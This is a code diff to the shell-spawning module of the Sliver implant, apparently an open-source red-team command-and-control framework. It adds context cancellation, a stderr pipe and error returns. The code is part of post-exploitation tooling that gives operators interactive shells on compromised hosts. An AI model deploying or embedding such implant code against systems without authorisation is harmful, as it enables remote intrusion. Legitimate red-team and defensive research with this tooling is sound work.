@@ -26,6 +26,7 @@ import (
 	"log"
 	// {{end}}
 
+	"context"
 	"os/exec"
 
 	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
@@ -44,63 +45,83 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
+func StartInteractive(tunnelID uint64, command []string, enablePty bool) (*Shell, error) {
 	if enablePty {
 		return ptyShell(tunnelID, command)
 	}
 	return pipedShell(tunnelID, command)
 }
 
-func pipedShell(tunnelID uint64, command []string) *Shell {
+func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[shell] %s", command)
 	// {{end}}
 
-	cmd := exec.Command(command[0], command[1:]...)
+	ctx, cancel := context.WithCancel(context.Background())
+
+	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] stdin pipe failed\n")
 		// {{end}}
-		return nil
+		cancel()
+		return nil, err
 	}
 	stdout, err := cmd.StdoutPipe()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] stdout pipe failed\n")
 		// {{end}}
-		return nil
+		cancel()
+		return nil, err
 	}
+
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] stderr pipe failed\n")
+		// {{end}}
+		cancel()
+		return nil, err
+	}
+
+	err = cmd.Start()
 
 	return &Shell{
 		ID:      tunnelID,
 		Command: cmd,
 		Stdout:  stdout,
 		Stdin:   stdin,
-	}
+		Stderr:  stderr,
+		Cancel:  cancel,
+	}, err
 }
 
-func ptyShell(tunnelID uint64, command []string) *Shell {
+func ptyShell(tunnelID uint64, command []string) (*Shell, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[ptmx] %s", command)
 	// {{end}}
 
-	cmd := exec.Command(command[0], command[1:]...)
+	ctx, cancel := context.WithCancel(context.Background())
+
+	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
 	term, err := pty.Start(cmd)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[term] %v, falling back to piped shell...", err)
 		// {{end}}
+		cancel()
 		return pipedShell(tunnelID, command)
 	}
-	cmd.Start()
 
 	return &Shell{
 		ID:      tunnelID,
 		Command: cmd,
 		Stdout:  term,
 		Stdin:   term,
-	}
+		Cancel:  cancel,
+	}, err
 }
 
 // GetSystemShellPath - Find bash or sh
